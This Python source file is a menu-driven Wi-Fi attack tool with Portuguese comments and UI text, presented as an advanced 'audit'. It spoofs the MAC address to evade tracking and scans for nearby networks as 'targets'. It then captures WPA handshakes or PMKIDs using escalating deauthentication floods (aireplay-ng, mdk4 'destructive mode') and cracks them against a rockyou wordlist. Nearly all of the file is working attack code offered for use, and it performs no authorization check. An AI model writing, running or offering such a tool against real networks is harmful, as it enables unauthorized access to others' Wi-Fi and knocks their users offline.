import subprocess
import os
import time
import csv
import json
import threading
from datetime import datetime

# ==============================================================
# UI MODERNA DE PRÓXIMA GERAÇÃO (THEME HACKER/CYBERPUNK)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] O módulo 'rich' não foi encontrado. Execute ./run_auditor.sh para instalá-lo automaticamente.")
    exit(1)

console = Console()

def print_banner():
    banner = """
[bold cyan]██████╗ ███████╗██╗    ██╗    ██╗██╗███████╗██╗[/bold cyan]
[bold cyan]██╔══██╗██╔════╝██║    ██║    ██║██║██╔════╝██║[/bold cyan]
[bold blue]██║  ██║███████╗██║    ██║ █╗ ██║██║█████╗  ██║[/bold blue]
[bold blue]██║  ██║╚════██║██║    ██║███╗██║██║██╔══╝  ██║[/bold blue]
[bold magenta]██████╔╝███████║██║    ╚███╔███╔╝██║██║     ██║[/bold magenta]
[bold magenta]╚═════╝ ╚══════╝╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝[/bold magenta]
[bold white]       A U D I T O R I A   A V A N Ç A D A     [/bold white]
    """
    console.print(Panel(banner, title="[bold green]MAGISTRADO SYSTEM ONLINE[/bold green]", border_style="cyan", padding=(1, 2)))

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo:
        command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.CalledProcessError as e:
        return None, e.stderr.strip()

def check_aircrack_ng():
    with console.status("[bold yellow]Verificando integridade do arsenal Magistrado (Aircrack, Hcx, MDK4, Macchanger)...", spinner="bouncingBar"):
        ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger"]
        todas_instaladas = True
        
        for ferramenta in ferramentas:
            stdout, _ = run_command(f"dpkg -s {ferramenta}")
            if stdout and "install ok installed" in stdout:
                pass
            else:
                console.print(f"[bold red] [-] {ferramenta} ausente no sistema![/bold red]")
                todas_instaladas = False

    if todas_instaladas:
        console.print("[bold green] [✔] Arsenal Magistrado: Carregado e Operacional.[/bold green]")
        return True

    if Confirm.ask("[bold yellow]Arsenal incompleto. Deseja baixar os componentes Magistrado agora?[/bold yellow]"):
        with console.status("[bold cyan]Baixando e instalando componentes avançados (MDK4 + Macchanger)...", spinner="dots2"):
            stdout, stderr = run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools mdk4 macchanger", sudo=True)
            if stdout:
                 console.print("[bold green] [✔] Arsenal atualizado com êxito.[/bold green]")
                 return True
            else:
                 console.print(Panel(f"[bold red]Falha crítica na instalação:\n{stderr}[/bold red]", title="ERRO APT"))
                 return False
    else:
        console.print("[bold red] [X] Operação abortada por falta de arsenal avançado.[/bold red]")
        return False

def show_manual():
    manual_path = "manual_auditoria_wifi.md"
    if os.path.exists(manual_path):
        with open(manual_path, "r", encoding="utf-8") as f:
            content = f.read()
        console.print(Panel(content, title="[bold yellow]MANUAL TÉCNICO EXPERT[/bold yellow]", border_style="yellow", padding=(1, 2)))
    else:
        console.print("[bold red]Arquivo de manual não encontrado.[/bold red]")
    Prompt.ask("\n[bold cyan]Pressione ENTER para retornar à Base...[/bold cyan]")

def save_networks_log(networks):
    log_file = "redes_identificadas_log.json"
    data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_redes_encontradas": len(networks),
        "redes": networks
    }
    try:
        todas_sessoes = []
        if os.path.exists(log_file):
             with open(log_file, "r", encoding="utf-8") as f:
                  try:
                      todas_sessoes = json.load(f)
                      if not isinstance(todas_sessoes, list): todas_sessoes = [todas_sessoes]
                  except json.JSONDecodeError:
                      pass
        todas_sessoes.append(data)
        with open(log_file, "w", encoding="utf-8") as f:
            json.dump(todas_sessoes, f, indent=4, ensure_ascii=False)
    except Exception as e:
        pass

def get_wifi_interface():
    with console.status("[bold cyan]Analisando hardware de rede...", spinner="point"):
        stdout, _ = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    
    if stdout:
        interfaces = stdout.split('\n')
        table = Table(title="[bold magenta]INTERFACES DE REDE DETECTADAS[/bold magenta]", show_header=True, header_style="bold cyan")
        table.add_column("ID", style="dim", width=4, justify="center")
        table.add_column("Nome da Interface", style="bold green", justify="left")
        
        for i, interface in enumerate(interfaces):
            table.add_row(str(i + 1), interface)
        
        console.print(table)
        
        choice = IntPrompt.ask("[bold yellow]Selecione a interface para injeção (ID)[/bold yellow]", choices=[str(i+1) for i in range(len(interfaces))])
        return interfaces[choice - 1]
    else:
        console.print("[bold red]Nenhuma interface Wi-Fi encontrada.[/bold red]")
        return None

def set_monitor_mode(interface):
    # Verificação inteligente
    stdout_check, _ = run_command(f"iw dev {interface} info")
    if stdout_check and "type monitor" in stdout_check:
        console.print(f"[bold green] [✔] Interface {interface} já está em Modo Monitor.[/bold green]")
        return interface

    console.print(f"\n[bold yellow][MAGISTRADO LEVEL][/bold yellow] Blindagem de Kernel e Injeção de Identidade Falsa...")
    with console.status("[bold red]Desativando bloqueios e camuflando endereço MAC...", spinner="bouncingBar"):
        run_command("rfkill unblock all", sudo=True)
        run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
        run_command("airmon-ng check kill", sudo=True)
        run_command(f"ip link set {interface} down", sudo=True)
        # Camuflagem Expert: Muda o MAC para um aleatório para evitar banimento ou rastreio
        run_command(f"macchanger -r {interface}", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        run_command("iw dev | grep mon | awk '{print $2}' | xargs -I {} iw dev {} del", sudo=True)

    with console.status("[bold cyan]Injetando driver de Monitoramento Avançado...", spinner="bouncingBar"):
        stdout, stderr = run_command(f"airmon-ng start {interface}", sudo=True)
        stdout_iw, _ = run_command("iw dev")
        
    interfaces_monitor = []
    current_iface = None
    for line in stdout_iw.split('\n'):
        if "Interface" in line:
            current_iface = line.split()[1]
        elif "type monitor" in line and current_iface:
            interfaces_monitor.append(current_iface)
            current_iface = None

    if f"{interface}mon" in interfaces_monitor:
         console.print(f"[bold green] [✔] Interface armada no modo stealth: {interface}mon[/bold green]")
         return f"{interface}mon"
    elif interface in interfaces_monitor:
         console.print(f"[bold green] [✔] Interface armada no modo stealth: {interface}[/bold green]")
         return interface
    else:
         console.print("[bold red] [!] Anomalia detectada. Forçando injeção via API Baixo Nível (ip/iw)...[/bold red]")
         run_command(f"ip link set {interface} down", sudo=True)
         run_command(f"iw dev {interface} set type monitor", sudo=True)
         run_command(f"ip link set {interface} up", sudo=True)
         stdout_iw, _ = run_command(f"iw dev {interface} info")
         if stdout_iw and "type monitor" in stdout_iw:
             console.print(f"[bold green] [✔] Sucesso! Interface forçada para modo monitor: {interface}[/bold green]")
             return interface
         return None

def set_managed_mode(interface):
    console.print(f"\n[bold blue]>>> Restaurando o Sistema para Estado Civil...[/bold blue]")
    with console.status("[bold yellow]Desarmando placa e reiniciando serviços de rede críticos...", spinner="dots2"):
        run_command(f"airmon-ng stop {interface}", sudo=True)
        run_command(f"ip link set {interface} down", sudo=True)
        run_command(f"macchanger -p {interface}", sudo=True) # Restaura o MAC original
        run_command(f"iw dev {interface} set type managed", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        run_command("rfkill unblock all", sudo=True)
        run_command("systemctl start wpa_supplicant", sudo=True)
        run_command("systemctl start NetworkManager", sudo=True)
        run_command("systemctl restart NetworkManager", sudo=True)
        run_command("nmcli networking off", sudo=True)
        time.sleep(1)
        run_command("nmcli networking on", sudo=True)
        
    console.print("[bold green] [✔] Interface devolvida ao modo gerenciado. Rede normal restabelecida.[/bold green]")

def scan_networks(monitor_interface):
    console.print(f"\n[bold magenta]>>> RADAR ATIVADO ({monitor_interface})[/bold magenta]")
    console.print("[bold cyan]Iniciando rastreamento de espectro Wi-Fi. Aperte [bold red]Ctrl+C[/bold red] para travar em um alvo.[/bold cyan]\n")
    
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")

    try:
        subprocess.run(f"sudo airodump-ng --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]>>> Rastreamento Finalizado.[/bold yellow]\n")

    csv_file = f"{output_prefix}-01.csv"
    networks = []
    
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                in_ap_section = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if row[0].strip() == "BSSID":
                        in_ap_section = True
                        continue
                    if row[0].strip() == "Station MAC": break
                    
                    if in_ap_section:
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        privacy = row[5].strip()
                        essid = row[13].strip()
                        if essid and essid != "\x00":
                            networks.append({'bssid': bssid, 'channel': channel, 'privacy': privacy, 'essid': essid})
        except Exception:
            pass

    if not networks:
        console.print("[bold red] Nenhuma rede detectada nas proximidades.[/bold red]")
        return None

    save_networks_log(networks)

    table = Table(title="[bold green]ALVOS POTENCIAIS RASTREADOS[/bold green]", show_lines=True)
    table.add_column("ID", justify="center", style="cyan", no_wrap=True)
    table.add_column("ESSID (Nome)", style="bold white")
    table.add_column("BSSID (MAC)", style="magenta")
    table.add_column("Canal", justify="center", style="yellow")
    table.add_column("Criptografia", justify="center", style="red")

    for i, net in enumerate(networks):
        table.add_row(str(i + 1), net['essid'], net['bssid'], net['channel'], net['privacy'])
    
    console.print(table)

    choice = IntPrompt.ask("\n[bold yellow]Fixar mira em qual alvo? (Digite o ID)[/bold yellow]", choices=[str(i+1) for i in range(len(networks))])
    target = networks[choice - 1]
    
    console.print(Panel(f"[bold cyan]Alvo Travado:[/bold cyan] {target['essid']} ({target['bssid']}) no Canal {target['channel']}", border_style="green"))
    
    console.print("\n[bold magenta]SELECIONE O VETOR DE ATAQUE DA OGIVA:[/bold magenta]")
    console.print("  [1] [bold cyan]Ataque Deauth Adaptativo (Handshake)[/bold cyan] - Aireplay + MDK4.")
    console.print("  [2] [bold red]Ataque PMKID (Clientless)[/bold red] - Magistrado. Ataca o Roteador diretamente.")
    atk_choice = Prompt.ask("[bold yellow]Estratégia (1 ou 2)[/bold yellow]", choices=["1", "2"], default="1")
    
    target['attack_type'] = 'pmkid' if atk_choice == '2' else 'handshake'
    return target

def capture_pmkid(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"[bold red]Iniciando Ataque PMKID Silencioso no alvo {bssid}...[/bold red]", border_style="red"))
    
    pcapng_file = f"{output_file}_pmkid.pcapng"
    hash_file = f"{output_file}_pmkid.16800"
    
    run_command(f"rm -f {pcapng_file} {hash_file}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    
    filtro_file = "alvo_filtro.txt"
    with open(filtro_file, "w") as f: f.write(bssid.replace(":", "") + "\n")
        
    dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng_file} --filterlist_ap={filtro_file} --filtermode=2 --enable_status=1"
    
    with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
        task = progress.add_task("Bomba Lógica Enviada. Aguardando falha criptográfica do Roteador...", total=45)
        proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        for _ in range(45):
            time.sleep(1)
            progress.update(task, advance=1)
        proc.terminate()
        
    os.remove(filtro_file)

    if os.path.exists(pcapng_file):
        run_command(f"hcxpcapngtool -o {hash_file} {pcapng_file}")
        if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
            console.print("[bold green] [✔] VITÓRIA PMKID! Hash extraído com sucesso.[/bold green]")
            return hash_file
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"[bold yellow]Iniciando Ataque Deauth Magistrado no alvo {bssid}...[/bold yellow]", border_style="yellow"))
    
    os.system(f"rm -f {output_file}-01.*")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    
    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    cap_file = f"{output_file}-01.cap"
    handshake_found = False
    
    for attempt in range(1, 5):
        console.print(f"\n[bold magenta]>>> MAGISTRADO: VETOR DE ATAQUE {attempt}/4[/bold magenta]")
        
        if attempt == 1:
            deauth_cmd = f"sudo aireplay-ng -0 8 -a {bssid} {monitor_interface}"
            console.print("[cyan][*] Aireplay: 8 pacotes Deauth direcionados...[/cyan]")
        elif attempt == 2:
            deauth_cmd = f"sudo aireplay-ng -0 20 -a {bssid} {monitor_interface}"
            console.print("[cyan][*] Aireplay: Deauth Broadcast Massivo...[/cyan]")
        elif attempt == 3:
            deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
            console.print("[bold yellow][*] MDK4: Flood de Desautenticação (Bypass Moderno)...[/bold yellow]")
        else:
            deauth_cmd = f"sudo mdk4 {monitor_interface} d -E {bssid}"
            console.print("[bold red][*] MDK4 MODO DESTRUTIVO: Forçando reconexão em massa...[/bold red]")

        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        with Progress(SpinnerColumn("dots"), TextColumn("[bold yellow]Vigiando chaves no ar... {task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
            task = progress.add_task("", total=25)
            for _ in range(25):
                time.sleep(1)
                progress.update(task, advance=1)
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                    stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                    if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout):
                        handshake_found = True
                        break
        
        deauth_proc.terminate()
        run_command("killall mdk4", sudo=True)
        if handshake_found:
            console.print(f"\n[bold green] [✔] HANDSHAKE CAPTURADO![/bold green]")
            break

    dump_proc.terminate()
    return cap_file if handshake_found else None

def crack_hash(hash_file, wordlist_file, bssid=None):
    console.print(Panel(f"[bold red]CRACKING MODULE ATIVADO[/bold red]", border_style="red"))
    if not os.path.exists(wordlist_file):
        console.print(f"[bold red]Erro: Wordlist '{wordlist_file}' não encontrada.[/bold red]")
        return

    if hash_file.endswith(".16800"):
        crack_cmd = f"hashcat -m 16800 -a 0 -w 3 {hash_file} {wordlist_file}"
        if run_command("which hashcat", capture_output=True)[0] == "":
            crack_cmd = f"aircrack-ng -w {wordlist_file} {hash_file}"
    else:
        crack_cmd = f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
        
    try:
        subprocess.run(crack_cmd, shell=True)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]>>> Processo Abortado.[/bold yellow]")

def main():
    if os.geteuid() != 0:
        console.print(Panel("[bold red]ACESSO NEGADO: Requer privilégios ROOT.[/bold red]"))
        return

    while True:
        os.system("clear")
        print_banner()
        console.print("\n[bold cyan]1.[/bold cyan] [white]Iniciar Incursão Magistrada[/white]")
        console.print("[bold cyan]2.[/bold cyan] [white]Acessar Info/Manuais[/white]")
        console.print("[bold cyan]3.[/bold cyan] [white]Sair[/white]")
        opcao = Prompt.ask("\n[bold green]Ação[/bold green]", choices=["1", "2", "3"])
        if opcao == '2': show_manual(); continue
        elif opcao == '3': return
        elif opcao == '1': break

    if not check_aircrack_ng(): return
    interface = get_wifi_interface()
    if not interface: return
    monitor_interface = set_monitor_mode(interface)
    if not monitor_interface: return

    try:
        target_network = scan_networks(monitor_interface)
        if not target_network: return
        prefix = f"capture_{target_network['essid'].replace(' ', '_')}"
        cap_file = None
        
        if target_network['attack_type'] == 'pmkid':
             cap_file = capture_pmkid(monitor_interface, target_network['bssid'], target_network['channel'], prefix)
             if not cap_file:
                  console.print("\n[bold yellow]Fallback: PMKID falhou. Iniciando Deauth...[/bold yellow]")
                  cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], prefix)
        else:
             cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], prefix)

        if not cap_file:
             console.print(Panel("[bold red]Falha: Alvo impenetrável no momento.[/bold red]"))
             return
             
        wordlist = Prompt.ask("\n[bold yellow]Caminho da Wordlist (ENTER para rockyou)[/bold yellow]", default="/usr/share/wordlists/rockyou.txt")
        crack_hash(cap_file, wordlist, target_network['bssid'])
        
    except KeyboardInterrupt:
        console.print("\n[bold red]>>> ABORTO.[/bold red]")
    except Exception as e:
        console.print(f"\n[bold red][!] ERRO: {e}[/bold red]")
    finally:
        set_managed_mode(monitor_interface)

if __name__ == "__main__":
    main()
